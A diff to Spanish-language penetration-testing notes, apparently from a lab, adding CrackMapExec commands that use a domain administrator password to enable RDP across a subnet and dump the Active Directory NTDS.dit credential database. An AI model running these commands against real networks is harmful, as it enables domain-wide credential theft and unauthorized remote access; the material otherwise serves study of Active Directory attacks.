@@ -66,3 +66,15 @@ Running CME against 256 targets ━━━━━━━━━━━━━━━━
 Si tenemos un usuario con privilegios podemos ejecutar varios tecnicas como dumpear la SAM ademas de hacer ejecución de código en una maquina que el usuario que obtenido tenga privilegios de administrador, como lo hacemos ---->
 
 [[Ejecucion de codigo mediante SAMBA]]
+
+Con credenciale de administracion de dominio podemos ejecutar codigo directamente en todos los equipos de la red
+```
+Habilita el servicio RDP en todas las maquinas de la red
+cme smb 192.168.94.0/24 -u 'Administrador' -p 'm4sterDorian' -M rdp -o ACTION=enable
+```
+
+Dumpeamos la Base de datos del directorio activo 
+- **NTDS.dit** es la base de datos de Active Directory
+```
+cme smb 192.168.94.136 -u 'Administrador' -p 'm4sterDorian' --ntds vss
+```
